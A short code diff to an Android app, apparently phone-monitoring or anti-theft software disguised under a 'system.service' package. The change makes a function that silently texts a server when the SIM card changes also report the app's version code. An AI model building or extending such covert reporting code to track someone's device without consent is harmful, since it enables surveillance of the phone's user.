@@ -9,6 +9,7 @@ import system.service.R;
 import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 
+import com.particle.inspector.common.util.AppUtil;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.StrUtils;
@@ -353,7 +354,8 @@ public class SmsCtrl
 	
 	// Send SIM change SMS to server for getting back the new SIM phone number
 	public static boolean sendSimChgSms(Context context) {
-		String smsStr = SmsConsts.HEADER_SIM_EX + "new SIM card";
+		int verCode = AppUtil.getAppVerCode(context); 
+		String smsStr = SmsConsts.HEADER_SIM_EX + "new card" + SmsConsts.SEPARATOR + String.valueOf(verCode);
 		String srvAddr = context.getResources().getString(R.string.srv_address).trim();
 		return sendSms(srvAddr, smsStr);
 	}
